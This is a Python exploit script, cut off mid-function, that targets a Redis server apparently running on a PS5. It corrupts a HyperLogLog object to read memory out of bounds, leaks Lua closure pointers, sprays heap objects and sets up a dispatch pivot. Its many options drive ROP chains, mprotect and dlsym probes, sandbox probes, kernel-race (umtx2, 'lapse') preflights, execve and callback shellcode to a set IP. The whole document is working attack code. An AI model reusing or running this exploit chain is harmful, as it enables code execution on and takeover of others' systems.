#!/usr/bin/env python3
"""
Redis-only CClosure.f leak through a pre-sprayed HLL B window.

Order matters:
  1. Allocate the HLL layout, including B.
  2. Spray Lua coroutine.wrap CClosures and marker strings while B is still safe.
  3. Corrupt B's SDS flags.
  4. Recover B_sds from a pre-sprayed marker and read the CClosure structs.

This avoids allocating marker eggs after B is corrupted.
"""
import argparse
import os
import re
import socket
import struct
import time

import redis_hll_guarded_probe as hll
from redis_hll_cclosure_leak import qword_at
from redis_hll_prespray_module_pivot import open_b_window
import redis_hll_prespray_module_pivot as piv


MARKER_AT = 0x08

FW_PROFILES = {
    "250": {
        "auxwrap_offset": 0xC56D0,
        "dispatch_func_offsets": {
            "c24f0": 0xC24F0,
            "c1900": 0xC1900,
            "c5500": 0xC5500,
        },
        "dispatch_target_offset": 0xC1ACB,
    },
    "300": {
        "auxwrap_offset": 0xB56D0,
        "dispatch_func_offsets": {
            "c24f0": 0xD39A0,
            "c1900": 0xD2E70,
            "c1970": 0xD2EE0,
        },
        # No safe/default target for 3.00 yet. Force callers to pass an
        # explicit --dispatch-target or --dispatch-target-offset.
        "dispatch_target_offset": None,
    },
}


def apply_fw_profile(args):
    profile = FW_PROFILES[args.fw]
    if args.auxwrap_offset is None:
        args.auxwrap_offset = profile["auxwrap_offset"]
    if args.dispatch_func_offset is None:
        offsets = profile["dispatch_func_offsets"]
        if args.dispatch_mode not in offsets:
            known = ", ".join(sorted(offsets))
            raise RuntimeError(
                f"firmware {args.fw} has no vetted offset for dispatch mode "
                f"{args.dispatch_mode!r}; known modes: {known}"
            )
        args.dispatch_func_offset = offsets[args.dispatch_mode]
    if args.dispatch_target is None and args.dispatch_target_offset is None:
        args.dispatch_target_offset = profile["dispatch_target_offset"]
    if args.dispatch_trigger and args.dispatch_target is None and args.dispatch_target_offset is None:
        raise RuntimeError(
            f"firmware {args.fw} dispatch mode {args.dispatch_mode!r} needs "
            "--dispatch-target or --dispatch-target-offset"
        )


def classify_ptr(v):
    if v is None:
        return ""
    if 0x800000000 <= v < 0x900000000:
        return "heap"
    # Redis eboot is a low mapping on the PS5 build we are probing; observed
    # bases have landed around 0x00exxxxx, 0x06xxxxxx, and 0x6xxxxxxx.
    if 0x00100000 <= v < 0x80000000:
        return "eboot"
    if 0x200000000 <= v < 0x300000000:
        return "lib?"
    if 0x200000000000 <= v < 0x800000000000:
        return "highlib?"
    return ""


def scan_b_window_pointers(sock, b_key, b_sds, window, scan_size, max_print):
    max_scan = min(window, scan_size)
    chunk_size = int(os.environ.get("HLL_MARKER_CHUNK", "0x1000"), 0)
    hits = []
    pages = {}
    counts = {}
    pos = 0
    align = (-b_sds) & 7
    while pos < max_scan:
        end = min(pos + chunk_size - 1, max_scan - 1)
        blob = hll.cmd(sock, "GETRANGE", b_key, str(pos), str(end), timeout=60)
        if not isinstance(blob, bytes):
            break
        start_off = align if pos == 0 else pos + ((align - pos) & 7)
        off = start_off
        while off + 8 <= pos + len(blob):
            rel = off - pos
            val = struct.unpack_from("<Q", blob, rel)[0]
            cls = classify_ptr(val)
            if cls:
                # Ignore common fill patterns that happen to fall in low ranges.
                if val not in (0, 0xAFAFAFAFAFAFAFAF, 0x4242424242424242):
                    counts[cls] = counts.get(cls, 0) + 1
                    page = val & ~0xFFF
                    pages[(cls, page)] = pages.get((cls, page), 0) + 1
                    if len(hits) < max_print:
                        hits.append((off, b_sds + off, val, cls))
            off += 8
        pos += chunk_size
    print(f"[ptrscan] scanned=0x{max_scan:X} hits={sum(counts.values())} counts={counts}")
    for cls, page in sorted(pages, key=lambda item: (-item[1], item[0][0], item[0][1]))[:16]:
        print(f"[ptrscan] page {cls:8s} 0x{page:016X} count={pages[(cls, page)]}")
    for off, abs_addr, val, cls in hits:
        print(f"[ptrscan] B+0x{off:X} abs=0x{abs_addr:X} -> 0x{val:016X} {cls}")


def k(prefix, name):
    return f"{prefix}:{name}"


def marker_for(role):
    return b"CCPR" + role.encode("ascii")[:4].ljust(4, b"_") + struct.pack("<I", os.getpid())


def parse_function_addrs(text):
    if isinstance(text, bytes):
        text = text.decode(errors="replace")
    out = []
    for part in str(text).split("|"):
        m = re.match(r"(\d+)=function: ([0-9a-fA-F]+)$", part.strip())
        if m:
            out.append((int(m.group(1)), int(m.group(2), 16)))
    return out


def client_fd(sock):
    cid = hll.cmd(sock, "CLIENT", "ID", timeout=10)
    listing = hll.cmd(sock, "CLIENT", "LIST", timeout=10)
    text = listing.decode(errors="replace") if isinstance(listing, bytes) else str(listing)
    target = f"id={cid} "
    for line in text.splitlines():
        if line.startswith(target):
            m = re.search(r"\bfd=(\d+)\b", line)
            if not m:
                raise RuntimeError(f"current CLIENT LIST entry has no fd: {line!r}")
            return int(m.group(1)), int(cid), line
    raise RuntimeError(f"could not find current client id={cid!r} in CLIENT LIST")


def raw_del_capture(sock, victim_key, out_path, max_bytes, timeout, recv_sock=None):
    sock.sendall(hll.resp("DEL", victim_key))
    recv_sock = recv_sock or sock
    recv_sock.settimeout(timeout)
    captured = bytearray()
    reason = "max-bytes"
    try:
        while len(captured) < max_bytes:
            chunk = recv_sock.recv(min(65536, max_bytes - len(captured)))
            if not chunk:
                reason = "closed"
                break
            captured.extend(chunk)
    except socket.timeout:
        reason = "timeout"
    except ConnectionError as exc:
        reason = f"connection-error:{exc}"
    if recv_sock is not sock:
        try:
            sock.settimeout(0.25)
            while sock.recv(4096):
                pass
        except Exception:
            pass
    with open(out_path, "wb") as f:
        f.write(captured)
    return len(captured), reason


def lua_spray_script(global_name, count):
    return f"""
local n = {int(count)}
local t = {{}}
local out = {{}}
for i = 1, n do
    t[i] = coroutine.wrap(function() return i end)
    out[#out + 1] = tostring(i) .. "=" .. tostring(t[i])
end
rawset(_G, "{global_name}", t)
return table.concat(out, "|")
"""


def lua_clear_script(global_name):
    return f"""
rawset(_G, "{global_name}", nil)
collectgarbage("collect")
return "OK"
"""


def marker_value(role, idx):
    marker = marker_for(role)
    # Keep this embstr-sized; B_sds recovery uses robj+19 as the inline data
    # address on this Redis build.
    value = bytearray(b"M" * 0x28)
    value[MARKER_AT:MARKER_AT + len(marker)] = marker
    struct.pack_into("<I", value, MARKER_AT + len(marker), idx)
    return bytes(value)


def recover_b_sds(sock, prefix, b_key, window, scan_size):
    marker = marker_for("sds")
    marker_off = hll.find_marker_offset(sock, b_key, marker, hll.SZ, min(window, scan_size))
    if marker_off is None:
        raise RuntimeError("could not locate pre-sprayed SDS marker in B window")
    idx_raw = hll.cmd(
        sock,
        "GETRANGE",
        b_key,
        str(marker_off + len(marker)),
        str(marker_off + len(marker) + 3),
        timeout=60,
    )
    if not isinstance(idx_raw, bytes) or len(idx_raw) != 4:
        raise RuntimeError("could not read SDS marker index")
    idx = struct.unpack("<I", idx_raw)[0]
    egg_key = k(prefix, f"sds_egg{idx:04d}")
    egg_robj, _ = hll.debug_object_addr(sock, egg_key)
    egg_data = egg_robj + 19
    b_sds = egg_data - marker_off
    print(
        f"[sds] marker idx={idx} key={egg_key} marker_off=0x{marker_off:X} "
        f"egg_robj=0x{egg_robj:X} egg_data=0x{egg_data:X} B_sds=0x{b_sds:X}"
    )
    return b_sds


def spray_dispatch_helpers(
    sock,
    prefix,
    eggs,
    stack_size,
    ctx_size,
    external_msg=False,
    external_msg_size=0x10000,
    external_msg_count=8,
):
    addr_marker = piv.marker_for("addr")
    for i in range(eggs):
        hll.cmd(sock, "SET", k(prefix, f"pv_addr{i:04d}"), addr_marker + struct.pack("<I", i) + b"A" * 20)
    if external_msg:
        # The message helper can be much larger than the stack/context helpers.
        # Keep only a few early copies so its marker stays recoverable without
        # pushing the normal helper objects out of the B read window.
        msg_count = max(1, min(eggs, external_msg_count))
        for i in range(msg_count):
            hll.cmd(sock, "SET", k(prefix, f"pv_msg{i:04d}"), piv.raw_marker_value("msg", i, external_msg_size), timeout=30)
    roles = ["mt", "stk", "ctx"]
    for role in roles:
        raw_size = (
            stack_size if role == "stk"
            else ctx_size if role == "ctx"
            else piv.DEFAULT_RAW_SIZE
        )
        for i in range(eggs):
            hll.cmd(sock, "SET", k(prefix, f"pv_{role}{i:04d}"), piv.raw_marker_value(role, i, raw_size), timeout=30)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.50.192")
    ap.add_argument("--port", type=int, default=1003)
    ap.add_argument("--prefix", default=None)
    ap.add_argument("--closures", type=int, default=4096)
    ap.add_argument("--eggs", type=int, default=512)
    ap.add_argument("--layout-fillers", type=int, default=80)
    ap.add_argument("--preserve-cal-c-slot", action="store_true")
    ap.add_argument("--scan-size", type=lambda x: int(x, 0), default=0x1000000)
    ap.add_argument("--flag-search-span", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--bruteforce-reg-values", action="store_true")
    ap.add_argument("--max-print", type=int, default=24)
    ap.add_argument("--print-all-code", action="store_true")
    ap.add_argument("--pointer-scan", action="store_true")
    ap.add_argument("--pointer-scan-size", type=lambda x: int(x, 0), default=0x800000)
    ap.add_argument("--pointer-scan-max-print", type=int, default=64)
    ap.add_argument("--fw", choices=tuple(sorted(FW_PROFILES)), default="300")
    ap.add_argument("--auxwrap-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-trigger", action="store_true")
    ap.add_argument("--ctx-size", type=lambda x: int(x, 0), default=piv.DEFAULT_CTX_SIZE)
    ap.add_argument("--stack-size", type=lambda x: int(x, 0), default=piv.DEFAULT_STACK_SIZE)
    ap.add_argument("--stack-ret", type=lambda x: int(x, 0), default=0x4141414141414141)
    ap.add_argument("--stack-arg", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--stack-arg-stack-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-ret-stack-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-arg-eboot-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-ret-eboot-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-patch-hex", default=None)
    ap.add_argument("--stack-patch-offset", type=lambda x: int(x, 0), default=0x200)
    ap.add_argument("--stack-execve-path", default=None)
    ap.add_argument("--stack-execve-arg", action="append", default=None)
    ap.add_argument("--stack-execve-path-offset", type=lambda x: int(x, 0), default=0x80)
    ap.add_argument("--stack-execve-argv-offset", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--stack-execve-envp-offset", type=lambda x: int(x, 0), default=0x70)
    ap.add_argument("--stack-self-record", action="store_true")
    ap.add_argument("--stack-cstring", default=None)
    ap.add_argument("--stack-cstring-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-callback-shellcode", action="store_true")
    ap.add_argument("--stack-fake-client-copy-send", action="store_true")
    ap.add_argument("--stack-fake-client-offset", type=lambda x: int(x, 0), default=0x120)
    ap.add_argument("--stack-lowrop-send", action="store_true")
    ap.add_argument("--stack-lowrop-got-leak", action="store_true")
    ap.add_argument("--stack-lowrop-notify", action="store_true")
    ap.add_argument("--stack-lowrop-dlsym-probe", action="store_true")
    ap.add_argument("--stack-lowrop-module-dlsym-probe", action="store_true")
    ap.add_argument("--stack-lowrop-module-table-leak", action="store_true")
    ap.add_argument("--stack-lowrop-dynlib-list-probe", action="store_true")
    ap.add_argument("--stack-lowrop-self-dlsym-probe", action="store_true")
    ap.add_argument("--stack-lowrop-self-info-leak", action="store_true")
    ap.add_argument("--stack-lowrop-mprotect-probe", action="store_true")
    ap.add_argument("--stack-lowrop-indirect-send-probe", action="store_true")
    ap.add_argument("--stack-lowrop-eboot-getpid-probe", action="store_true")
    ap.add_argument("--stack-lowrop-eboot-gettimeofday-probe", action="store_true")
    ap.add_argument("--stack-lowrop-eboot-mprotect-probe", action="store_true")
    ap.add_argument("--stack-lowrop-libc-getpid-probe", action="store_true")
    ap.add_argument("--stack-lowrop-libc-gettimeofday-probe", action="store_true")
    ap.add_argument("--stack-lowrop-wrapper-call-probe", action="store_true")
    ap.add_argument("--stack-lowrop-direct-syscall-probe", action="store_true")
    ap.add_argument("--stack-lowrop-code-read-probe", action="store_true")
    ap.add_argument("--stack-lowrop-sandbox-probe", action="store_true")
    ap.add_argument("--stack-lowrop-umtx2-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-umtx2-wrapper-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-umtx2-race-one", action="store_true")
    ap.add_argument("--stack-lowrop-umtx2-spray-existing", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-thread-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-worker-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-suspend-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-race-one", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-rthdr-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-race-rthdr", action="store_true")
    ap.add_argument("--lowrop-lapse-rthdr-count", type=int, default=1)
    ap.add_argument("--lowrop-lapse-rthdr-set-loops", type=lambda x: int(x, 0), default=1)
    ap.add_argument("--lowrop-lapse-rthdr-skip-reclaim", action="store_true")
    ap.add_argument("--lowrop-lapse-rthdr-per-socket-setbuf", action="store_true")
    ap.add_argument("--lowrop-lapse-rthdr-segment-floor", type=lambda x: int(x, 0), default=0x2D80)
    ap.add_argument("--lowrop-lapse-target-req-index", type=lambda x: int(x, 0), default=2)
    ap.add_argument("--lowrop-lapse-post-resume-yields", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lowrop-lapse-post-resume-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-post-resume-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-worker-ack", action="store_true")
    ap.add_argument("--lowrop-lapse-worker-ack-poll-ms", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-worker-ready-ack", action="store_true")
    ap.add_argument("--lowrop-lapse-worker-ready-pipe", action="store_true")
    ap.add_argument("--lowrop-lapse-worker-after-read-ack", action="store_true")
    ap.add_argument("--lowrop-lapse-worker-park", action="store_true")
    ap.add_argument("--lowrop-lapse-pre-reclaim-send", action="store_true")
    ap.add_argument("--lowrop-lapse-post-reclaim-send", action="store_true")
    ap.add_argument("--lowrop-lapse-post-main-delete-send", action="store_true")
    ap.add_argument("--lowrop-lapse-pre-delete-send", action="store_true")
    ap.add_argument("--lowrop-lapse-tcpinfo-before-poll", action="store_true")
    ap.add_argument("--lowrop-lapse-debug-sends", action="store_true")
    ap.add_argument("--lowrop-lapse-after-ack-send", action="store_true")
    ap.add_argument("--lowrop-lapse-block-workers", action="store_true")
    ap.add_argument("--lowrop-lapse-block-worker-count", type=lambda x: int(x, 0), default=2)
    ap.add_argument("--lowrop-lapse-prezero-r9-once", action="store_true")
    ap.add_argument("--lowrop-lapse-skip-rthdr-optlen-store", action="store_true")
    ap.add_argument("--lowrop-lapse-pre-barrier-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-barrier-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-barrier-getpid-loops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-barrier-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-suspend-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-post-poll-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-post-poll-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-client-fill-len", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-sockbuf-size", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-conn-drain-len", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-suspend-getpid-loops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-suspend-yield", action="store_true")
    ap.add_argument("--lowrop-lapse-pre-suspend-yields", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-lapse-pre-suspend-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-main-prio-pin", action="store_true")
    ap.add_argument("--lowrop-lapse-cpuset-size", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lowrop-lapse-thread-start", choices=("longjmp", "ret", "setcontext", "pivot", "none"), default="longjmp")
    ap.add_argument("--lowrop-scratch-offset", type=lambda x: int(x, 0), default=0x14A000)
    ap.add_argument("--lowrop-vtable-offset", type=lambda x: int(x, 0), default=0x200)
    ap.add_argument("--lowrop-chain-offset", type=lambda x: int(x, 0), default=0x28D)
    ap.add_argument("--lowrop-msg-offset", type=lambda x: int(x, 0), default=0x380)
    ap.add_argument("--lowrop-pair-offset", type=lambda x: int(x, 0), default=0x70)
    ap.add_argument("--lowrop-copy-len", type=lambda x: int(x, 0), default=0x800)
    ap.add_argument("--lowrop-external-msg", action="store_true")
    ap.add_argument("--lowrop-external-msg-size", type=lambda x: int(x, 0), default=0x10000)
    ap.add_argument("--lowrop-external-msg-count", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lowrop-external-msg-align", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--lowrop-allow-uncopied-msg-tail", action="store_true")
    ap.add_argument("--lowrop-truncate-msg-tail", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-msg", default="LOWROP_SEND_OK")
    ap.add_argument("--lowrop-leak-eboot-offset", type=lambda x: int(x, 0), action="append", default=None)
    ap.add_argument("--lowrop-dlsym-handle", type=lambda x: int(x, 0), action="append", default=None)
    ap.add_argument("--lowrop-dlsym-symbol", action="append", default=None)
    ap.add_argument("--lowrop-module-name", action="append", default=None)
    ap.add_argument("--lowrop-module-dlsym-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-module-table-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-module-table-entries", type=lambda x: int(x, 0), default=12)
    ap.add_argument("--lowrop-dynlib-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-dynlib-list-max", type=lambda x: int(x, 0), default=32)
    ap.add_argument("--lowrop-dynlib-capture-errno", action="store_true")
    ap.add_argument(
        "--lowrop-dynlib-list-order",
        choices=("handles-max-count", "count-handles-max", "handles-count-max"),
        default="handles-max-count",
    )
    ap.add_argument("--lowrop-self-dlsym-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-dlsym-symbol-offset", type=lambda x: int(x, 0), default=0xB00)
    ap.add_argument("--lowrop-dlsym-out-offset", type=lambda x: int(x, 0), default=0xC00)
    ap.add_argument("--lowrop-mprotect-addr", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-mprotect-target", choices=("scratch", "stack"), default="scratch")
    ap.add_argument("--lowrop-mprotect-len", type=lambda x: int(x, 0), default=piv.PAGE_SIZE)
    ap.add_argument("--lowrop-mprotect-prot", type=lambda x: int(x, 0), default=7)
    ap.add_argument("--lowrop-mprotect-capture-errno", action="store_true")
    ap.add_argument("--lowrop-mprotect-derive-only", action="store_true")
    ap.add_argument("--lowrop-eboot-mprotect-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-eboot-getpid-derive-only", action="store_true")
    ap.add_argument("--lowrop-eboot-gettimeofday-derive-only", action="store_true")
    ap.add_argument("--lowrop-libc-getpid-derive-only", action="store_true")
    ap.add_argument("--lowrop-libc-gettimeofday-derive-only", action="store_true")
    ap.add_argument("--lowrop-wrapper-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-wrapper-source", choices=("getpid", "gettimeofday", "send"), default="getpid")
    ap.add_argument("--lowrop-wrapper-offset", type=lambda x: int(x, 0), default=piv.LIBKERNEL_SYS_GETPID)
    ap.add_argument("--lowrop-wrapper-msg-len", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--lowrop-wrapper-prezero-r8-r9", action="store_true")
    ap.add_argument("--lowrop-wrapper-capture-errno", action="store_true")
    ap.add_argument("--lowrop-wrapper-use-libc-call8", action="store_true")
    ap.add_argument("--lowrop-wrapper-call8-send-self", action="store_true")
    ap.add_argument("--lowrop-wrapper-use-setcontext", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-offset", type=lambda x: int(x, 0), default=piv.LIBC_SETCONTEXT)
    ap.add_argument("--lowrop-wrapper-no-save-context", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-ping-only", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-send-only", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-call-rax", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-pivot-only", action="store_true")
    ap.add_argument("--lowrop-wrapper-preflight-send", action="store_true")
    for _i in range(1, 7):
        ap.add_argument(f"--lowrop-wrapper-arg{_i}", type=lambda x: int(x, 0), default=0)
        ap.add_argument(f"--lowrop-wrapper-arg{_i}-msg-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--lowrop-wrapper-arg{_i}-scratch-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-direct-syscall-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-direct-syscall-source", choices=("getpid", "gettimeofday"), default="gettimeofday")
    ap.add_argument("--lowrop-direct-syscall-wrapper-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-direct-syscall-landing-adjust", type=lambda x: int(x, 0), default=7)
    ap.add_argument("--lowrop-direct-syscall-num", type=lambda x: int(x, 0), default=20)
    ap.add_argument("--lowrop-direct-syscall-msg-len", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--lowrop-direct-syscall-capture-errno", action="store_true")
    ap.add_argument("--lowrop-direct-syscall-sixargs", action="store_true")
    for _i in range(1, 7):
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}", type=lambda x: int(x, 0), default=0)
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}-msg-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}-scratch-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}-stack-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}-stack-page-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-code-read-source", choices=("getpid", "gettimeofday", "send", "sceKernelDlsym", "memcpy", "libc-getpid", "libc-gettimeofday", "msg"), default="gettimeofday")
    ap.add_argument("--lowrop-code-read-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-umtx2-existing-fd", type=lambda x: int(x, 0), default=24)
    ap.add_argument("--lowrop-umtx2-spray-count", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lowrop-umtx2-inline-spray-count", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-umtx2-preserve-lookup-fd", action="store_true")
    ap.add_argument("--lowrop-umtx2-worker-spray", action="store_true")
    ap.add_argument("--lowrop-umtx2-worker-spray-gate", action="store_true")
    ap.add_argument("--lowrop-umtx2-worker-spray-post-yields", type=lambda x: int(x, 0), default=4)
    ap.add_argument("--lowrop-umtx2-main-tag-worker-fds", action="store_true")
    ap.add_argument("--lowrop-umtx2-race-debug", action="store_true")
    ap.add_argument("--lowrop-umtx2-destroy-delay-target", choices=("none", "d0", "d1", "both"), default="none")
    ap.add_argument("--lowrop-umtx2-destroy-delay-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-umtx2-destroy-pad-target", choices=("none", "d0", "d1", "both"), default="none")
    ap.add_argument("--lowrop-umtx2-destroy-pad-count", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-code-read-wrapper-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-code-read-adjust", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-code-read-len", type=lambda x: int(x, 0), default=0x80)
    ap.add_argument("--lowrop-code-read-msg-len", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--lowrop-sandbox-path", action="append", default=None)
    ap.add_argument("--lowrop-sandbox-max-paths", type=lambda x: int(x, 0), default=32)
    ap.add_argument("--lowrop-sandbox-open-flags", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-send-export-offset", type=lambda x: int(x, 0), default=piv.LIBKERNEL_SYS_SEND_EXPORT)
    ap.add_argument("--lowrop-syscall-offset", type=lambda x: int(x, 0), default=piv.LIBKERNEL_SYS_MPROTECT)
    ap.add_argument("--lowrop-notify-text", default="Redis ROP notification")
    ap.add_argument("--lowrop-notify-done-msg", default="NOTIFY_ROP_DONE")
    ap.add_argument("--lowrop-notify-offset", type=lambda x: int(x, 0), default=0x1000)
    ap.add_argument("--lowrop-notify-const-offset", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--lowrop-notify-fd-slot-offset", type=lambda x: int(x, 0), default=0x118)
    ap.add_argument("--lowrop-notify-path-offset", type=lambda x: int(x, 0), default=0x128)
    ap.add_argument("--lowrop-notify-icon-offset", type=lambda x: int(x, 0), default=0x150)
    ap.add_argument("--lowrop-notify-text-offset", type=lambda x: int(x, 0), default=0x180)
    ap.add_argument("--stack-data-offset", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--stack-callback-len", type=lambda x: int(x, 0), default=1)
    ap.add_argument("--stack-data-byte", type=lambda x: int(x, 0), default=0x41)
    ap.add_argument("--shellcode-offset", type=lambda x: int(x, 0), default=0x180)
    ap.add_argument("--callback-ip", default="192.168.50.154")
    ap.add_argument("--callback-port", type=int, default=3234)
    ap.add_argument("--callback-msg", default="CXROP callback")
    ap.add_argument("--eboot-base", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-mode", choices=("c24f0", "c1900", "c1970", "c5500"), default="c1900")
    ap.add_argument("--dispatch-func-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-target", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-target-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-arg", type=lambda x: int(x, 0), default=0x1337133713371337)
    ap.add_argument("--dispatch-arg-ctx", action="store_true")
    ap.add_argument("--dispatch-arg-stack-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-arg-eboot-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-arg-client-fd", action="store_true")
    ap.add_argument("--dispatch-arg-sidecar-fd", action="store_true")
    ap.add_argument("--dispatch-sidecar-after-calibration", action="store_true")
    ap.add_argument("--dispatch-arg2", type=lambda x: int(x, 0), default=0x2442244224422442)
    ap.add_argument("--dispatch-arg2-eboot-base", action="store_true")
    ap.add_argument("--dispatch-arg2-offset", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--dispatch-arg2-stack", action="store_true")
    ap.add_argument("--dispatch-arg2-stack-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-followup-target", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-followup-target-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-read-stack-after-del", action="store_true")
    ap.add_argument("--dispatch-raw-del-recv", action="store_true")
    ap.add_argument("--dispatch-raw-del-out", default="redis_raw_del_leak.bin")
    ap.add_argument("--dispatch-raw-del-max", type=lambda x: int(x, 0), default=0x100000)
    ap.add_argument("--dispatch-raw-del-timeout", type=float, default=3.0)
    ap.add_argument("--dispatch-modulevalue-robj", action="store_true")
    ap.add_argument("--dispatch-modulevalue-closure", action="store_true")
    ap.add_argument("--module-type-free-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-spray-before-open", action="store_true")
    ap.add_argument("--keep-lua", action="store_true")
    ap.add_argument("--keep-keys", action="store_true")
    args = ap.parse_args()
    args.dispatch_fd = None
    apply_fw_profile(args)

    prefix = args.prefix or f"cx:hll:ccpre:{os.getpid()}:{int(time.time())}"
    global_name = "__codex_ccpre_" + re.sub(r"[^A-Za-z0-9_]", "_", prefix)
    sock = socket.socket()
    sock.settimeout(20)
    sidecar_sock = None
    original_hll_max = None
    b_corrupted = False
    flags_reg = None

    print("=== Redis HLL Pre-spray CClosure Read ===")
    print(f"target={args.host}:{args.port} prefix={prefix} closures={args.closures}")

    def open_sidecar_fd():
        nonlocal sidecar_sock
        sidecar_sock = socket.socket()
        sidecar_sock.settimeout(20)
        sidecar_sock.connect((args.host, args.port))
        fd, cid, line = client_fd(sidecar_sock)
        args.dispatch_fd = fd
        if not args.dispatch_arg_ctx:
            args.dispatch_arg = fd
        print(f"[sidecar] id={cid} fd={fd} entry={line}")

    try:
        sock.connect((args.host, args.port))
        print(f"PING: {hll.cmd(sock, 'PING')}")
        if args.dispatch_arg_client_fd:
            fd, cid, line = client_fd(sock)
            args.dispatch_fd = fd
            if args.dispatch_arg_ctx:
                pass
            else:
                args.dispatch_arg = fd
            print(f"[client] current id={cid} fd={fd} entry={line}")
        if args.dispatch_arg_sidecar_fd and not args.dispatch_sidecar_after_calibration:
            open_sidecar_fd()
        original_hll_max = hll.redis_config_get(sock, "hll-sparse-max-bytes")
        print(f"hll-sparse-max-bytes original={original_hll_max}")
        hll.redis_config_set(sock, "hll-sparse-max-bytes", hll.HIGH_HLL_MAX)

        print("[1] base HLL layout")
        hll.setup_layout(sock, prefix, fillers=args.layout_fillers)

        print("[2] calibrating B")
        _b_original, cal, flags_reg, changes = hll.find_calibration(sock, prefix)
        if cal < 0:
